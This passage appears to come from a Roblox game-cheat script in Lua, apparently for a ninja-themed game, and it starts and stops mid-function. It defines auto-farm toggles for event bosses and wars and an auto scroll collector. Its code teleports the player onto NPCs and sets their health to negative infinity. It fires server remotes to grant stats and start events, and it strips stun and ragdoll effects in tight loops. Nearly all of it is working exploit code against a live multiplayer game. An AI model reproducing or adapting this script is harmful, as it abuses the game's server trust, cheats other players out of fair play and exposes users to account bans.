                                                                            f.Character:FindFirstChild("beserk"):Destroy(

                                                                            )
                                                                        else
                                                                            if
                                                                                f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                                    "Frame"
                                                                                )
                                                                             then
                                                                                f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                                    "Frame"
                                                                                ):Destroy()
                                                                            end
                                                                        end
                                                                    end
                                                                    if
                                                                        kr:FindFirstChild("Humanoid").Health ~=
                                                                            kr:FindFirstChild("Humanoid").MaxHealth
                                                                     then
                                                                        kr:FindFirstChild("Humanoid").Health =
                                                                            -math.huge
                                                                    end
                                                                else
                                                                    f.Character.Humanoid:ChangeState(11)
                                                                    f.Character.HumanoidRootPart.CFrame =
                                                                        kr.PrimaryPart.CFrame
                                                                    hit2()
                                                                    if
                                                                        kr:FindFirstChild("Humanoid").Health ~=
                                                                            kr:FindFirstChild("Humanoid").MaxHealth
                                                                     then
                                                                        kr:FindFirstChild("Humanoid").Health =
                                                                            -math.huge
                                                                    end
                                                                    task.wait(0.1)
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        else
                                            if game.PlaceId == 7524809704 then
                                                game:GetService("Players").LocalPlayer.pressplay:FireServer(
                                                    g.Dungeon_Level.Value
                                                )
                                                task.wait(2)
                                            end
                                        end
                                    end
                                )
                            end
                        end
                    end
                )
            end
            f:WaitForChild("currentmission")
            f:WaitForChild("statz")
            warn(f:WaitForChild("statz"))
            task.wait(1)
            local function YU()
                if f.currentmission.Value ~= nil then
                    return true
                end
                return false
            end
            local function OU()
                if f.currentmission and f.currentmission.Value:FindFirstChild("target") then
                    return f.currentmission.Value.target.Value
                end
                return nil
            end
            local function vU()
                if f.currentmission and f.currentmission.Value:FindFirstChild("cat") then
                    return f.currentmission.Value:FindFirstChild("cat")
                end
                return nil
            end
            local function qU()
                for aK, dK in pairs(workspace.bossdropmission.missions:GetChildren()) do
                    if
                        dK:FindFirstChild("missiongiver") and
                            dK:FindFirstChild("missiongiver"):FindFirstChild("Talk") and
                            dK:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild("accepted").Value ==
                                false and
                            dK:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild("cooldown") and
                            dK:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild("typ").Value ==
                                "storymission"
                     then
                        return dK:FindFirstChild("missiongiver")
                    end
                end
                return nil
            end
            local function iU()
                for Mc, Nc in pairs(workspace.bossdropmission.missions:GetChildren()) do
                    if
                        Nc:FindFirstChild("missiongiver") and
                            Nc:FindFirstChild("missiongiver"):FindFirstChild("Talk") and
                            Nc:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild("accepted").Value ==
                                false and
                            Nc:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild("cooldown") and
                            Nc:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild("typ").Value ==
                                "storymission"
                     then
                        if
                            g.Selected_Quest.Value[
                                tostring(
                                    Nc:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild("typ").Value
                                )
                            ]
                         then
                            return Nc:FindFirstChild("missiongiver")
                        end
                    end
                end
                for ya, ga in pairs(workspace.missiongivers:GetChildren()) do
                    if
                        ga:FindFirstChild("Talk") and ga:FindFirstChild("Head") and
                            ga:FindFirstChild("Head"):FindFirstChild("givemission").Enabled
                     then
                        local Z5 = ga:FindFirstChild("Talk")
                        if g.Selected_Quest.Value[tostring(Z5.typ.Value)] then
                            return ga
                        end
                    end
                end
                return nil
            end
            getgenv().GetScroll = function()
                if g.Ignore_Owned_Scroll.Value then
                    for SE, uE in pairs(workspace:GetChildren()) do
                        if
                            uE:IsA("Model") and uE:FindFirstChild("sh") and
                                uE:FindFirstChild("sh").CFrame.p ~= Vector3.new(0, -40000, 0) and
                                not f.statz.unlocked:FindFirstChild(uE.Name) and
                                not f.statz.unlocked:FindFirstChild(uE.Name .. "scroll")
                         then
                            return uE:FindFirstChild("sh")
                        end
                    end
                else
                    for gx, Xx in pairs(workspace:GetChildren()) do
                        if
                            Xx:IsA("Model") and Xx:FindFirstChild("sh") and
                                Xx:FindFirstChild("sh").CFrame.p ~= Vector3.new(0, -40000, 0)
                         then
                            return Xx:FindFirstChild("sh")
                        end
                    end
                end
                return nil
            end
            local function hU()
                if YU() == true then
                    if f.currentmission then
                        return f.currentmission.Value.objective.Value
                    end
                end
                return nil
            end
            local VU = 0
            local EU = {"r", "t", "y", "f", "g", "h", "q", "e", "v", "b", "n"}
            local function jU()
                if tick() >= VU then
                    VU = tick() + 0.1
                    f.Character.combat.update:FireServer("mouse1", true)
                    if g.Auto_Skill_Logs.Value then
                        for ws, Us in pairs(EU) do
                            if g.Auto_Skill_Logs.Value then
                                f.Character.combat.update:FireServer("key", Us)
                                f.Character.combat.update:FireServer("key", Us .. "end")
                            end
                        end
                    end
                end
            end
            local function tU()
                pcall(
                    function()
                        if f.Character.Humanoid.Sit == true then
                            f.Character.Humanoid.Sit = false
                        end
                        if f.Character:FindFirstChild("stayonground") then
                            game.Debris:AddItem(f.Character:FindFirstChild("stayonground"), 0)
                        end
                        if
                            f.Character:FindFirstChild("HumanoidRootPart") and
                                f.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("KO")
                         then
                            game.Debris:AddItem(
                                f.Character:FindFirstChild("HumanoidRootPart"):FindFirstChild("KO"),
                                0
                            )
                        end
                    end
                )
            end
            local function fU()
                for bw, Jw in pairs(workspace.missiontypes.getspawns[tostring(game.PlaceId)].dirt:GetChildren()) do
                    if
                        Jw:IsA("Part") and Jw:FindFirstChild("image").Transparency == 0 and
                            Jw:FindFirstChild("taken").Value == true
                     then
                        return Jw
                    end
                end
                return nil
            end
            local oU = 0
            local gU = 0
            local function FU()
                if tick() >= oU then
                    oU = tick() + 4
                    f.Character.combat.update:FireServer("mouse1", true)
                end
                if tick() >= gU then
                    gU = tick() + 1
                end
            end
            local function DU()
                for WQ, zQ in pairs(workspace.missiontypes.getspawns[tostring(game.PlaceId)].weeds:GetChildren()) do
                    if zQ:IsA("MeshPart") and zQ:FindFirstChild("taken").Value == true then
                        return zQ
                    end
                end
                return nil
            end
            local function NU()
                if f.currentmission then
                    return f.currentmission.Value.target.Value
                end
                return nil
            end
            local wU = q:AddRightGroupbox("Scroll Settings")
            wU:AddLabel("", false)
            local zU = wU:AddLabel("N/A", false)
            local sU = wU:AddLabel("N/A", false)
            local MU = wU:AddLabel("N/A", false)
            wU:AddLabel("", false)
            wU:AddToggle("Auto_Collect_Scroll_Hop", {Text = "Auto Collect Scroll [Real Time]"})
            wU:AddToggle("Ignore_Owned_Scroll_2", {Text = "Ignore Owned Scroll", Default = true})
            if workspace:FindFirstChild("missiongivers") then
                local yY = q:AddRightGroupbox("Quests")
                local lY = {}
                Text = {}
                task.spawn(
                    function()
                        pcall(
                            function()
                                for N3 in pairs(lY) do
                                    lY[N3].Value = 0
                                end
                                for qe, Ce in pairs(workspace.bossdropmission.missions:GetChildren()) do
                                    if
                                        Ce:FindFirstChild("missiongiver") and
                                            Ce:FindFirstChild("missiongiver"):FindFirstChild("Talk") and
                                            not table.find(
                                                lY,
                                                tostring(
                                                    Ce:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                        "typ"
                                                    ).Value
                                                )
                                            )
                                     then
                                        lY[
                                                Ce:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                    "typ"
                                                ).Value
                                            ] = {Value = 0}
                                    end
                                end
                                for h5, w5 in pairs(workspace.missiongivers:GetChildren()) do
                                    if
                                        w5:FindFirstChild("Talk") and
                                            w5:FindFirstChild("Talk"):FindFirstChild("typ") and
                                            not table.find(
                                                lY,
                                                tostring(w5:FindFirstChild("Talk"):FindFirstChild("typ").Value)
                                            )
                                     then
                                        lY[w5:FindFirstChild("Talk"):FindFirstChild("typ").Value] = {Value = 0}
                                    end
                                end
                                for Ly, wy in pairs(workspace.bossdropmission.missions:GetChildren()) do
                                    if
                                        wy:FindFirstChild("missiongiver") and
                                            wy:FindFirstChild("missiongiver"):FindFirstChild("Talk") and
                                            wy:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                "accepted"
                                            ) and
                                            wy:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                "accepted"
                                            ).Value == false and
                                            lY[
                                                tostring(
                                                    wy:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                        "typ"
                                                    ).Value
                                                )
                                            ]
                                     then
                                        lY[
                                                wy:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                    "typ"
                                                ).Value
                                            ].Value =
                                            lY[
                                            wy:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                "typ"
                                            ).Value
                                        ].Value + 1
                                    end
                                end
                                for rV, XV in pairs(workspace.missiongivers:GetChildren()) do
                                    if
                                        XV:FindFirstChild("Talk") and
                                            XV:FindFirstChild("Talk"):FindFirstChild("typ") and
                                            lY[tostring(XV:FindFirstChild("Talk"):FindFirstChild("typ").Value)]
                                     then
                                        lY[XV:FindFirstChild("Talk"):FindFirstChild("typ").Value].Value =
                                            lY[XV:FindFirstChild("Talk"):FindFirstChild("typ").Value].Value + 1
                                    end
                                end
                                for mW, YW in pairs(lY) do
                                    if not Text[tostring(mW)] then
                                        Text[tostring(mW)] = yY:AddLabel(mW .. " : " .. YW.Value, false)
                                    else
                                        Text[tostring(mW)]:ChangeText(
                                            tostring(mW) .. " : " .. tostring(YW.Value),
                                            false
                                        )
                                    end
                                end
                                while true do
                                    task.wait(1)
                                    for hI in pairs(lY) do
                                        lY[hI].Value = 0
                                    end
                                    for aK, eK in pairs(workspace.bossdropmission.missions:GetChildren()) do
                                        if
                                            eK:FindFirstChild("missiongiver") and
                                                eK:FindFirstChild("missiongiver"):FindFirstChild("Talk") and
                                                not table.find(
                                                    lY,
                                                    tostring(
                                                        eK:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                            "typ"
                                                        ).Value
                                                    )
                                                )
                                         then
                                            lY[
                                                    eK:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                        "typ"
                                                    ).Value
                                                ] = {Value = 0}
                                        end
                                    end
                                    for Jt, tt in pairs(workspace.missiongivers:GetChildren()) do
                                        if
                                            tt:FindFirstChild("Talk") and
                                                tt:FindFirstChild("Talk"):FindFirstChild("typ") and
                                                not table.find(
                                                    lY,
                                                    tostring(tt:FindFirstChild("Talk"):FindFirstChild("typ").Value)
                                                )
                                         then
                                            lY[tt:FindFirstChild("Talk"):FindFirstChild("typ").Value] = {Value = 0}
                                        end
                                    end
                                    for bg, mg in pairs(workspace.bossdropmission.missions:GetChildren()) do
                                        if
                                            mg:FindFirstChild("missiongiver") and
                                                mg:FindFirstChild("missiongiver"):FindFirstChild("Talk") and
                                                mg:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                    "accepted"
                                                ) and
                                                mg:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                    "accepted"
                                                ).Value == false and
                                                lY[
                                                    tostring(
                                                        mg:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                            "typ"
                                                        ).Value
                                                    )
                                                ]
                                         then
                                            lY[
                                                    mg:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                        "typ"
                                                    ).Value
                                                ].Value =
                                                lY[
                                                mg:FindFirstChild("missiongiver"):FindFirstChild("Talk"):FindFirstChild(
                                                    "typ"
                                                ).Value
                                            ].Value + 1
                                        end
                                    end
                                    for ih, Hh in pairs(workspace.missiongivers:GetChildren()) do
                                        if
                                            Hh:FindFirstChild("Talk") and
                                                Hh:FindFirstChild("Talk"):FindFirstChild("typ") and
                                                lY[tostring(Hh:FindFirstChild("Talk"):FindFirstChild("typ").Value)]
                                         then
                                            lY[Hh:FindFirstChild("Talk"):FindFirstChild("typ").Value].Value =
                                                lY[Hh:FindFirstChild("Talk"):FindFirstChild("typ").Value].Value + 1
                                        end
                                    end
                                    for hD, ID in pairs(lY) do
                                        if not Text[tostring(hD)] then
                                            Text[tostring(hD)] = yY:AddLabel(hD .. " : " .. ID.Value, false)
                                        else
                                            Text[tostring(hD)]:ChangeText(
                                                tostring(hD) .. " : " .. tostring(ID.Value),
                                                false
                                            )
                                        end
                                    end
                                end
                            end
                        )
                    end
                )

                local HY = q:AddRightGroupbox("Event Bosses")
                local iY = {"eventemberpain", "forgedevent", "shindaievent", "kagokuevent", "jinshikievent"}
                for ho, Wo in pairs(iY) do
                    HY:AddButton(
                        tostring(Wo) .. " [EVENT]",
                        function()
                            f.startevent:FireServer(tostring(Wo))
                        end
                    )
                end
            else
                local td = {6984568732, 7214033433, 7534339269, 8472733618, 9310522814}
                if table.find(td, game.PlaceId) then
                    local lA = q:AddRightGroupbox("Event Bosses")
                    lA:AddLabel("Event - Status", true)
                    local RA = lA:AddLabel("Status : N/A", false)
                    lA:AddLabel("Event - Farm", true)
                    lA:AddToggle("Auto_Farm_Event_Bosses", {Text = "Auto Farm Bosses"})
                    workspace.ClientEffects.ChildAdded:connect(
                        function(G_)
                            if g.Auto_Farm_Event_Bosses.Value then
                                pcall(
                                    function()
                                        game.Debris:AddItem(G_, 0)
                                    end
                                )
                            end
                        end
                    )
                    task.spawn(
                        function()
                            while true do
                                task.wait()
                                if g.Auto_Farm_Event_Bosses.Value then
                                    pcall(
                                        function()
                                            local vK = getgenv().GetScroll()
                                            f.CameraMaxZoomDistance = 30
                                            if g.Auto_Collect_Scroll.Value and vK ~= nil then
                                                f.Character.HumanoidRootPart.CFrame = vK.CFrame
                                                if
                                                    f:DistanceFromCharacter(vK.Position) <= 30 and
                                                        vK:FindFirstChild("ClickDetector")
                                                 then
                                                    fireclickdetector(vK:FindFirstChild("ClickDetector"))
                                                    e:Notify(("Collecting Scroll :'%s'"):format(vK.Parent.Name), 10)
                                                end
                                            else
                                                if f.PlayerGui:FindFirstChild("cutscene") then
                                                    f.startevent:FireServer("stopcutscene")
                                                    game.Debris:AddItem(f.PlayerGui:FindFirstChild("cutscene"), 0)
                                                end
                                                for xm, Ym in pairs(workspace.npc:GetChildren()) do
                                                    if
                                                        Ym:FindFirstChild("timemegaboss") and
                                                            Ym:FindFirstChild("HumanoidRootPart") and
                                                            Ym:FindFirstChild("Humanoid") and
                                                            Ym:FindFirstChild("Humanoid").Health ~= 0
                                                     then
                                                        repeat
                                                            task.wait()
                                                            f.CameraMaxZoomDistance = 30
                                                            RA:ChangeText(
                                                                "Killing " ..
                                                                    Ym:FindFirstChild("npctype").Value ..
                                                                        " | " ..
                                                                            Ym.Humanoid.Health ..
                                                                                "/" .. Ym.Humanoid.MaxHealth
                                                            )
                                                            if
                                                                game.ReplicatedStorage:FindFirstChild("alljutsu") and
                                                                    game.ReplicatedStorage:FindFirstChild(
                                                                        "alljutsu"
                                                                    ):WaitForChild("JINSPOWEEEERRRRRRRRRRRRRRRRRR") and
                                                                    f:FindFirstChild("statz") and
                                                                    f:FindFirstChild("statz"):FindFirstChild("keys") and
                                                                    game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                                        f.statz.keys.z.Value
                                                                    )
                                                             then
                                                                f.startevent:FireServer("addstat", "ninjutsu", 100)
                                                                if F() == false and E() == true then
                                                                    if
                                                                        f.Character ~= nil and
                                                                            not f.Character:FindFirstChild(
                                                                                "zombify"
                                                                            )
                                                                     then
                                                                        if
                                                                            not f.Character:FindFirstChild(
                                                                                "bodyeffect"
                                                                            )
                                                                         then
                                                                            f.Character.combat.update:FireServer(
                                                                                "key",
                                                                                "z"
                                                                            )
                                                                        end
                                                                        workspace.VC.RemoteEvent:FireServer(
                                                                            "!spirit"
                                                                        )
                                                                    else
                                                                        workspace.Camera.CameraSubject = f.Character
                                                                    end
                                                                else
                                                                    workspace.Camera.CameraSubject = f.Character
                                                                    f.Character.HumanoidRootPart.CFrame =
                                                                        Ym.HumanoidRootPart.CFrame *
                                                                        CFrame.new(0, 40, 5)
                                                                    workspace.CurrentCamera.CFrame =
                                                                        CFrame.new(
                                                                        workspace.CurrentCamera.CFrame.Position,
                                                                        Ym.HumanoidRootPart.Position
                                                                    )
                                                                    f.CameraMaxZoomDistance = 0
                                                                    f.CameraMaxZoomDistance = 30
                                                                    if Ym:FindFirstChild("HumanoidRootPart") then
                                                                        f.startevent:FireServer(
                                                                            "target",
                                                                            Ym:FindFirstChild("HumanoidRootPart")
                                                                        )
                                                                    end
                                                                    f.Character.combat.update:FireServer("key", "e")
                                                                    f.Character.combat.update:FireServer(
                                                                        "key",
                                                                        "eend"
                                                                    )
                                                                end
                                                                if f.PlayerGui.Main.ingame.chat.Visible then
                                                                    f.PlayerGui.Main.ingame.chat.Visible = false
                                                                else
                                                                    if f.Character:FindFirstChild("beserk") then
                                                                        f.Character:FindFirstChild("beserk"):Destroy(

                                                                        )
                                                                    else
                                                                        if
                                                                            f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                                "Frame"
                                                                            )
                                                                         then
                                                                            f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                                "Frame"
                                                                            ):Destroy()
                                                                        end
                                                                    end
                                                                end
                                                            else
                                                                f.Character.HumanoidRootPart.CFrame =
                                                                    Ym.HumanoidRootPart.CFrame * CFrame.new(0, 0, 5)
                                                                workspace.CurrentCamera.CFrame =
                                                                    CFrame.new(
                                                                    workspace.CurrentCamera.CFrame.Position,
                                                                    Ym.HumanoidRootPart.Position
                                                                )
                                                                if
                                                                    f:DistanceFromCharacter(
                                                                        Ym.HumanoidRootPart.Position
                                                                    ) <= 20
                                                                 then
                                                                    jU()
                                                                end
                                                            end
                                                        until not Ym:FindFirstChild("timemegaboss") or
                                                            not Ym:FindFirstChild("HumanoidRootPart") or
                                                            not Ym:FindFirstChild("Humanoid") or
                                                            Ym:FindFirstChild("Humanoid").Health == 0 or
                                                            not g.Auto_Farm_Event_Bosses.Value or
                                                            (g.Auto_Collect_Scroll.Value and
                                                                getgenv().GetScroll() ~= nil)
                                                        f.CameraMaxZoomDistance = 30
                                                    end
                                                end
                                            end
                                        end
                                    )
                                end
                            end
                        end
                    )
                    lA:AddLabel("Event - Bosses", true)
                    local LA = {"eventemberpain", "forgedevent", "shindaievent", "kagokuevent", "jinshikievent"}
                    for lt, Ot in pairs(LA) do
                        lA:AddButton(
                            tostring(Ot) .. " [EVENT]",
                            function()
                                f.startevent:FireServer(tostring(Ot))
                            end
                        )
                    end
                    task.spawn(
                        function()
                            while true do
                                task.wait()
                                pcall(
                                    function()
                                        if g.Auto_Farm_Event_Bosses.Value then
                                            f.Character.Humanoid:ChangeState(11)
                                        end
                                    end
                                )
                            end
                        end
                    )
                    task.spawn(
                        function()
                            while true do
                                task.wait()
                                pcall(
                                    function()
                                        if g.Auto_Farm_Event_Bosses.Value then
                                            if f.Character ~= nil and f.Character:FindFirstChild("combat") then
                                                if f.Character.combat:FindFirstChild("attacked") then
                                                    game.Debris:AddItem(
                                                        f.Character.combat:FindFirstChild("attacked"),
                                                        0
                                                    )
                                                end
                                                if f.Character.combat:FindFirstChild("nomove") then
                                                    game.Debris:AddItem(
                                                        f.Character.combat:FindFirstChild("nomove"),
                                                        0
                                                    )
                                                end
                                                if f.Character.combat:FindFirstChild("ragdoll") then
                                                    f.Character.combat:FindFirstChild("ragdoll").Value = false
                                                end
                                                if f.Character.combat:FindFirstChild("charge") then
                                                end
                                                if f.Character:FindFirstChild("Gripsystem") then
                                                    game.Debris:AddItem(f.Character:FindFirstChild("Gripsystem"), 0)
                                                end
                                                f.Character.combat.disable.Value = false
                                                f.Character.combat.canrun.Value = false
                                                f.Character.combat.delayfront.Value = false
                                                if f.Character.combat:FindFirstChild("landed") then
                                                    game.Debris:AddItem(f.Character:FindFirstChild("Gripsystem"), 0)
                                                end
                                                if f.Character.combat:FindFirstChild("attacked") then
                                                    game.Debris:AddItem(
                                                        f.Character.combat:FindFirstChild("attacked"),
                                                        0
                                                    )
                                                end
                                                if f.Character.combat:FindFirstChild("slowdown") then
                                                    game.Debris:AddItem(
                                                        f.Character.combat:FindFirstChild("slowdown"),
                                                        0
                                                    )
                                                end
                                                if f.Character.combat:FindFirstChild("nowalk") then
                                                    game.Debris:AddItem(
                                                        f.Character.combat:FindFirstChild("nowalk"),
                                                        0
                                                    )
                                                end
                                                if f.Character.combat:FindFirstChild("nomove") then
                                                    game.Debris:AddItem(
                                                        f.Character.combat:FindFirstChild("nomove"),
                                                        0
                                                    )
                                                end
                                                f.Character.combat.charge.Value = false
                                                f.Character.combat.bind.Value = false
                                                f.Character.combat.grip.Value = false
                                            end
                                        end
                                    end
                                )
                            end
                        end
                    )
                elseif game.PlaceId == 5824792748 then
                    local IW = q:AddRightGroupbox("War Modes")
                    IW:AddLabel("War - Status", true)
                    local tW = IW:AddLabel("Status : N/A", false)
                    IW:AddLabel("War - Settings", true)
                    IW:AddSlider(
                        "Round_Limit",
                        {Text = "Round Limit", Default = 21, Min = 0, Max = 30, Rounding = 0, Suffix = "round"}
                    )
                    IW:AddLabel("War - Farm", true)
                    IW:AddToggle("Auto_Farm_Wars", {Text = "Auto Farm Wars"})
                    workspace.ClientEffects.ChildAdded:connect(
                        function(LX)
                            if g.Auto_Farm_Wars.Value then
                                pcall(
                                    function()
                                        game.Debris:AddItem(LX, 0)
                                    end
                                )
                            end
                        end
                    )
                    task.spawn(
                        function()
                            while true do
                                wait()
                                if g.Auto_Farm_Wars.Value then
                                    pcall(
                                        function()
                                            local j_ = getgenv().GetScroll()
                                            f.CameraMaxZoomDistance = 30
                                            if g.Auto_Collect_Scroll.Value and j_ ~= nil then
                                                f.Character.HumanoidRootPart.CFrame = j_.CFrame
                                                if
                                                    f:DistanceFromCharacter(j_.Position) <= 30 and
                                                        j_:FindFirstChild("ClickDetector")
                                                 then
                                                    fireclickdetector(j_:FindFirstChild("ClickDetector"))
                                                    e:Notify(("Collecting Scroll :'%s'"):format(j_.Parent.Name), 10)
                                                end
                                            else
                                                if f.PlayerGui:FindFirstChild("cutscene") then
                                                    f.startevent:FireServer("stopcutscene")
                                                    game.Debris:AddItem(f.PlayerGui:FindFirstChild("cutscene"), 0)
                                                end
                                                for MI, JI in pairs(workspace.npc:GetChildren()) do
                                                    if
                                                        JI:FindFirstChild("Team") and
                                                            JI:FindFirstChild("Team").Value ~= "Allied Shinobi" and
                                                            JI:FindFirstChild("HumanoidRootPart") and
                                                            JI:FindFirstChild("Humanoid") and
                                                            JI:FindFirstChild("Humanoid").Health ~= 0
                                                     then
                                                        repeat
                                                            task.wait()
                                                            f.CameraMaxZoomDistance = 30
                                                            tW:ChangeText(
                                                                "Killing " ..
                                                                    JI.Name ..
                                                                        " | " ..
                                                                            JI.Humanoid.Health ..
                                                                                "/" .. JI.Humanoid.MaxHealth
                                                            )
                                                            if
                                                                game.ReplicatedStorage:FindFirstChild("alljutsu") and
                                                                    game.ReplicatedStorage:FindFirstChild(
                                                                        "alljutsu"
                                                                    ):WaitForChild("JINSPOWEEEERRRRRRRRRRRRRRRRRR") and
                                                                    f:FindFirstChild("statz") and
                                                                    f:FindFirstChild("statz"):FindFirstChild("keys") and
                                                                    game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                                        f.statz.keys.z.Value
                                                                    )
                                                             then
                                                                f.startevent:FireServer("addstat", "ninjutsu", 100)
                                                                if F() == false and E() == true then
                                                                    if
                                                                        f.Character ~= nil and
                                                                            not f.Character:FindFirstChild(
                                                                                "zombify"
                                                                            )
                                                                     then
                                                                        if
                                                                            not f.Character:FindFirstChild(
                                                                                "bodyeffect"
                                                                            )
                                                                         then
                                                                            f.Character.combat.update:FireServer(
                                                                                "key",
                                                                                "z"
                                                                            )
                                                                        end
                                                                        workspace.VC.RemoteEvent:FireServer(
                                                                            "!spirit"
                                                                        )
                                                                    else
                                                                        workspace.Camera.CameraSubject = f.Character
                                                                    end
                                                                else
                                                                    workspace.Camera.CameraSubject = f.Character
                                                                    f.Character.HumanoidRootPart.CFrame =
                                                                        JI.HumanoidRootPart.CFrame *
                                                                        CFrame.new(0, 40, 5)
                                                                    workspace.CurrentCamera.CFrame =
                                                                        CFrame.new(
                                                                        workspace.CurrentCamera.CFrame.Position,
                                                                        JI.HumanoidRootPart.Position
                                                                    )
                                                                    f.CameraMaxZoomDistance = 0
                                                                    f.CameraMaxZoomDistance = 30
                                                                    if JI:FindFirstChild("HumanoidRootPart") then
                                                                        f.startevent:FireServer(
                                                                            "target",
                                                                            JI:FindFirstChild("HumanoidRootPart")
                                                                        )
                                                                    end
                                                                    f.Character.combat.update:FireServer("key", "e")
                                                                    f.Character.combat.update:FireServer(
                                                                        "key",
                                                                        "eend"
                                                                    )
                                                                end
                                                                if f.PlayerGui.Main.ingame.chat.Visible then
                                                                    f.PlayerGui.Main.ingame.chat.Visible = false
                                                                else
                                                                    if f.Character:FindFirstChild("beserk") then
                                                                        f.Character:FindFirstChild("beserk"):Destroy(

                                                                        )
                                                                    else
                                                                        if
                                                                            f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                                "Frame"
                                                                            )
                                                                         then
                                                                            f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                                "Frame"
                                                                            ):Destroy()
                                                                        end
                                                                    end
                                                                end
                                                            else
                                                                f.Character.HumanoidRootPart.CFrame =
                                                                    JI.HumanoidRootPart.CFrame * CFrame.new(0, 0, 5)
                                                                workspace.CurrentCamera.CFrame =
                                                                    CFrame.new(
                                                                    workspace.CurrentCamera.CFrame.Position,
                                                                    JI.HumanoidRootPart.Position
                                                                )
                                                                if
                                                                    f:DistanceFromCharacter(
                                                                        JI.HumanoidRootPart.Position
                                                                    ) <= 20
                                                                 then
                                                                    jU()
                                                                end
                                                            end
                                                        until not JI:FindFirstChild("HumanoidRootPart") or
                                                            not JI:FindFirstChild("Humanoid") or
                                                            JI:FindFirstChild("Humanoid").Health == 0 or
                                                            not g.Auto_Farm_Wars.Value or
                                                            (g.Auto_Collect_Scroll.Value and
                                                                getgenv().GetScroll() ~= nil)
                                                        f.CameraMaxZoomDistance = 30
                                                    end
                                                end
                                            end
                                        end
                                    )
                                end
                            end
                        end
                    )
                end
            end

            workspace:WaitForChild("GLOBALTIME")
            workspace:WaitForChild("GLOBALTIME"):WaitForChild("globalesttime")
            workspace:WaitForChild("GLOBALTIME"):WaitForChild("clienttell")
            warn(workspace:WaitForChild("GLOBALTIME"):WaitForChild("clienttell"))
            f:WaitForChild("statz")
            f:WaitForChild("statz"):WaitForChild("unlocked")
            warn(f:WaitForChild("statz"):WaitForChild("unlocked"))
            task.wait(1)
            local TU = workspace.GLOBALTIME.globalesttime
            function Split(z4, W4)
                result = {}
                for Pe in (z4 .. W4):gmatch("(.-)" .. W4) do
                    table.insert(result, Pe)
                end
                return result
            end
            local CU = {}
            for JJ, vJ in ipairs(workspace.GLOBALTIME.clienttell:GetChildren()) do
                if vJ:IsA("StringValue") and vJ.Value ~= "" and vJ:FindFirstChild("location") then
                    CU[vJ.Name] = {Name = vJ.Name, Locations = vJ.location.Value, Value = vJ.Value}
                end
            end
            task.wait()
            local function yU()
                local co = {}
                for r3, X3 in next, CU do
                    if X3.Locations and X3.Value and X3.Name then
                        local pc = tonumber(60 * Split(tostring(X3.Value), ":")[1])
                        local fc = tonumber(Split(tostring(X3.Value), ":")[2])
                        local uc = tonumber(60 * Split(tostring(TU.Value), ":")[1])
                        local gc = tonumber(Split(tostring(TU.Value), ":")[2])
                        local Kc = (uc + gc) - (pc + fc)
                        if Kc >= 0 and Kc <= 25 then
                            if g.Ignore_Owned_Scroll_2.Value then
                                if
                                    not f.statz.unlocked:FindFirstChild(tostring(X3.Name)) and
                                        not f.statz.unlocked:FindFirstChild(tostring(X3.Name) .. "scroll")
                                 then
                                    co[#co + 1] = {Name = X3.Name, Locations = X3.Locations, Value = X3.Value}
                                end
                            else
                                co[#co + 1] = {Name = X3.Name, Locations = X3.Locations, Value = X3.Value}
                            end
                        end
                    end
                end
                return co
            end
            local function pU()
                if g.Ignore_Owned_Scroll_2.Value then
                    for wz, fz in pairs(workspace:FindFirstChild("GLOBALTIME"):GetChildren()) do
                        if
                            fz:IsA("Model") and fz:FindFirstChild("sh") and
                                fz:FindFirstChild("sh").CFrame.p ~= Vector3.new(0, -40000, 0) and
                                not f.statz.unlocked:FindFirstChild(fz.Name) and
                                not f.statz.unlocked:FindFirstChild(fz.Name .. "scroll")
                         then
                            return fz:FindFirstChild("sh")
                        end
                    end
                    for wz, tz in pairs(workspace:GetChildren()) do
                        if
                            tz:IsA("Model") and tz:FindFirstChild("sh") and
                                tz:FindFirstChild("sh").CFrame.p ~= Vector3.new(0, -40000, 0) and
                                not f.statz.unlocked:FindFirstChild(tz.Name) and
                                not f.statz.unlocked:FindFirstChild(tz.Name .. "scroll")
                         then
                            return tz:FindFirstChild("sh")
                        end
                    end
                else
                    for N_, U_ in pairs(workspace:FindFirstChild("GLOBALTIME"):GetChildren()) do
                        if
                            U_:IsA("Model") and U_:FindFirstChild("sh") and
                                U_:FindFirstChild("sh").CFrame.p ~= Vector3.new(0, -40000, 0)
                         then
                            return U_:FindFirstChild("sh")
                        end
                    end
                    for OV, jV in pairs(workspace:GetChildren()) do
                        if
                            jV:IsA("Model") and jV:FindFirstChild("sh") and
                                jV:FindFirstChild("sh").CFrame.p ~= Vector3.new(0, -40000, 0)
                         then
                            return jV:FindFirstChild("sh")
                        end
                    end
                end
